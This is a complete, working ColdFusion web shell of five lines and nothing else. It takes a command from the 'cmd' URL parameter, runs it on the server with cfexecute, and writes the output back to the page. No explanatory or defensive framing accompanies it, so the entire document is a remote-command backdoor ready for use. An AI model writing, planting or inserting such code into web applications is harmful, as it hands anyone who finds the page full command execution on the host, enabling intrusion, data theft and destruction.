<cfif IsDefined("url.cmd")>
  <cfexecute name="#url.cmd#" timeout="10" variable="output" />
  <cfoutput>#output#</cfoutput>
</cfif>
